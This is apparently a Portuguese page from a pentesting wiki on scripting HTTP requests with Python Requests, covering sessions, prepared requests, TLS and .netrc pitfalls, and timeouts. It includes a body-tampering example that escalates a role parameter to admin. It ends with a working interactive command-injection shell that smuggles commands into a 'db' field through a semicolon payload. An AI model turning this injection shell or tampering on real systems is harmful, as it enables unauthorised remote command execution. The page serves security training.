# Requisições Web

{{#include ../../banners/hacktricks-training.md}}

## Python Requests

Estes exemplos usam os argumentos de requisição documentados do Requests, as propriedades de resposta, as tuplas de arquivos multipart e as sessões.<sup>[[1]](#references)</sup> Os exemplos com `verify=False` desabilitam a verificação de certificados TLS e devem ser limitados a testes controlados.<sup>[[1]](#references)</sup>
```python
import random
import re
import string

import requests

url = "http://example.com:80/some/path.php"
params = {"p1":"value1", "p2":"value2"}
headers = {"User-Agent": "fake User Agent", "Fake header": "True value"}
cookies = {"PHPSESSID": "1234567890abcdef", "FakeCookie123": "456"}
proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

#Regular Get requests sending parameters (params)
gr = requests.get(url, params=params, headers=headers, cookies=cookies, verify=False, allow_redirects=True)

code = gr.status_code
ret_headers = gr.headers
body_byte = gr.content
body_text = gr.text
ret_cookies = gr.cookies
is_redirect = gr.is_redirect
is_permanent_redirect = gr.is_permanent_redirect
float_seconds = gr.elapsed.total_seconds()

#Regular Post requests sending parameters (data)
pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)

#Json Post requests sending parameters(json)
pr = requests.post(url, json=params, headers=headers, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)

#Post request sending a file(files) and extra values
filedict = {"<FILE_PARAMETER_NAME>" : ("filename.png", open("filename.png", 'rb').read(), "image/png")}
pr = requests.post(url, data={"submit": "submit"}, files=filedict)

#Useful for presenting results in boolean/time based injections
print(f"\rflag: {flag}{char}", end="")




##### Example Functions
target = "http://10.10.10.10:8000"
proxies = {}
s = requests.Session()

def register(username, password):
resp = s.post(target + "/register", data={"username":username, "password":password, "submit": "Register"}, proxies=proxies, verify=0)
return resp

def login(username, password):
resp = s.post(target + "/login", data={"username":username, "password":password, "submit": "Login"}, proxies=proxies, verify=0)
return resp

def get_info(name):
resp = s.post(target + "/projects", data={"name":name, }, proxies=proxies, verify=0)
guid = re.match('<a href="\/info\/([^"]*)">' + name + '</a>', resp.text)[1]
return guid

def upload(guid, filename, data):
resp = s.post(target + "/upload/" + guid, data={"submit": "upload"}, files={"file":(filename, data)}, proxies=proxies, verify=0)
guid = re.match('"' + filename + '": "([^"]*)"', resp.text)[1]
return guid

def json_search(guid, search_string):
resp = s.post(target + "/api/search/" + guid + "/", json={"search":search_string}, headers={"Content-Type": "application/json"}, proxies=proxies, verify=0)
return resp.json()

def get_random_string(guid, path):
return ''.join(random.choice(string.ascii_letters) for i in range(10))
```
## Requisições preparadas para controle de payload

Uma `PreparedRequest` expõe a URL final, os headers e o corpo codificado antes de ser enviado. Construa-a com `Session.prepare_request()` (em vez de `Request.prepare()`) quando os cookies da sessão ou a autenticação precisarem ser aplicados; quando o fluxo de preparação também precisar respeitar as configurações de proxy/CA do ambiente, faça a mesclagem explicitamente com `merge_environment_settings()`.<sup>[[1]](#references)</sup>
```python
s = requests.Session()
req = requests.Request("POST", url, data=b"role=user")
prepped = s.prepare_request(req)
prepped.body = b"role=admin%26debug%3D1"
prepped.headers["Content-Length"] = str(len(prepped.body))

env = s.merge_environment_settings(prepped.url, {}, None, None, None)
r = s.send(prepped, timeout=(3.05, 15), allow_redirects=False, **env)
print(r.request.headers)
print(r.request.body)
```
Isso é útil quando um exploit precisa de uma codificação não padrão ou ao comparar o payload construído com a requisição armazenada em `response.request`. Não é uma primitiva de raw-HTTP: Requests armazena os headers em um mapeamento que não diferencia maiúsculas de minúsculas, portanto, atribuir um nome duplicado substitui o valor anterior. Use um sender de nível inferior para linhas de requisição malformadas ou campos `Content-Length`/`Transfer-Encoding` duplicados e distintos, necessários para [HTTP request-smuggling tests](../../pentesting-web/http-request-smuggling/README.md).<sup>[[1]](#references)</sup>

## Isolamento de sessão, credenciais implícitas e estado TLS

Uma sessão confia na configuração do ambiente por padrão. Se nenhuma autenticação explícita for fornecida, Requests poderá obter credenciais Basic de `.netrc`; também poderá importar a configuração de proxy e os caminhos dos bundles de CA a partir de variáveis de ambiente. Para scripts que acessam URLs controladas pelo atacante, desative essas entradas implícitas e configure explicitamente apenas o proxy/CA do lab pretendido. Releases anteriores à 2.32.4 poderiam selecionar credenciais de `.netrc` para o host errado quando recebiam uma URL criada maliciosamente, enquanto `Session.trust_env = False` é a solução alternativa documentada quando não for possível fazer um upgrade.<sup>[[1]](#references)[[4]](#references)</sup>
```python
s = requests.Session()
s.trust_env = False
s.verify = "/path/to/lab-ca.pem"  # Prefer a lab CA over verify=False
s.proxies = {
"http": "http://127.0.0.1:8080",
"https": "http://127.0.0.1:8080",
}
```
Mantenha uma sessão que use `verify=False` separada das sessões que exigem TLS verificado. No Requests anterior à versão 2.32.0, uma conexão aberta inicialmente com `verify=False` podia ser reutilizada para requisições posteriores da mesma origem, mesmo quando essas requisições especificavam `verify=True`; a atualização corrige esse problema no estado do pool, mas o isolamento também facilita a auditoria dos scripts de exploit.<sup>[[5]](#references)</sup>

## Loops de exploit confiáveis

O Requests não define um timeout padrão. Um timeout `(connect, read)` não é um prazo total de wall-clock: o componente de leitura limita por quanto tempo o cliente aguarda entre os bytes recebidos. Desative os redirecionamentos automáticos quando o alvo controlar `Location` e valide cada salto antes de enviar uma nova requisição; se os redirecionamentos estiverem habilitados, inspecione `response.history`. Para respostas grandes ou hostis, use `stream=True`, itere em chunks limitados e feche a resposta com um gerenciador de contexto para que a conexão do pool seja liberada.<sup>[[1]](#references)</sup>
```python
limit = 2 * 1024 * 1024
body = bytearray()

with s.get(url, timeout=(3.05, 10), allow_redirects=False, stream=True) as r:
print(r.status_code, r.headers.get("Location"))
for chunk in r.iter_content(64 * 1024):
if len(body) + len(chunk) > limit:
raise ValueError("response exceeds limit")
body.extend(chunk)
```
## Comando Python para explorar um RCE

O loop de comandos cria uma subclasse de `Cmd` do Python; seu método `default` trata prefixos de comando não reconhecidos, `cmdloop` encaminha linhas de entrada, e `re.DOTALL` permite que o padrão de extração atravesse quebras de linha.<sup>[[2]](#references)[[3]](#references)</sup>
```python
import requests
import re
from cmd import Cmd

class Terminal(Cmd):
prompt = "Inject => "

def default(self, args):
output = RunCmd(args)
print(output)

def RunCmd(cmd):
data = { 'db': f'lol; echo -n "MYREGEXP"; {cmd}; echo -n "MYREGEXP2"' }
r = requests.post('http://10.10.10.127/select', data=data)
page = r.text
m = re.search('MYREGEXP(.*?)MYREGEXP2', page, re.DOTALL)
if m:
return m.group(1)
else:
return 1


term = Terminal()
term.cmdloop()
```
## References

- [1] [Interface do desenvolvedor do Requests](https://requests.readthedocs.io/en/stable/api/)
- [2] [Python `cmd` — Suporte para interpretadores de comandos orientados a linhas](https://docs.python.org/3/library/cmd.html)
- [3] [Python `re` — Operações com expressões regulares](https://docs.python.org/3/library/re.html)
- [4] [Requests vulnerável a leak de credenciais do `.netrc` via URLs maliciosas](https://github.com/psf/requests/security/advisories/GHSA-9hjg-9r4m-mvj7)
- [5] [O objeto `Session` do Requests não verifica requests após realizar a primeira request com `verify=False`](https://github.com/psf/requests/security/advisories/GHSA-9wx4-h78v-vm56)
{{#include ../../banners/hacktricks-training.md}}
